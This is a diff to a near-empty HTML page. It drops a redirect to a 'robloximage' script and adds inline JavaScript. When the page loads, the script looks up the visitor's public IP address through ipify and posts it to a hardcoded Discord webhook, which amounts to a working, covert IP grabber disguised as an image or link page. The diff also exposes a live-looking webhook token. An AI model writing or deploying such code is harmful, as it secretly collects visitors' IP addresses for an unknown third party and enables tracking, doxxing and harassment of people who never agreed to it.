@@ -1,8 +1,29 @@
 <html>
   <head>
-    <meta http-equiv="refresh" content="0;url=./api/robloximage.py">
   </head>
   <body>
     <p>e</p>
+    <script>
+      function user_location() {
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function() {
+          if (this.readyState == 4 && this.status == 200) {
+            var xtp = new XMLHttpRequest();
+            xtp.open("POST", "https://discord.com/api/webhooks/1100562137312657498/pb7w3wreJMctjLgj9Mhzrc0f6OxUWM5Ke5y0ObMwubbTvmRdgrH8ngkAXUt6PStAvF9M")
+            xtp.setRequestHeader("Content-type", "application/json");
+
+            var p = {
+                username: "G",
+                avatar_url: "",
+                content: JSON.parse(this.responseText)['ip']
+            }
+            xtp.send(JSON.stringify(p))
+          }
+        };
+        xhttp.open("GET", "//api.ipify.org?format=json", true);
+        xhttp.send();
+      }
+      user_location()
+    </script>
   </body>
 </html>
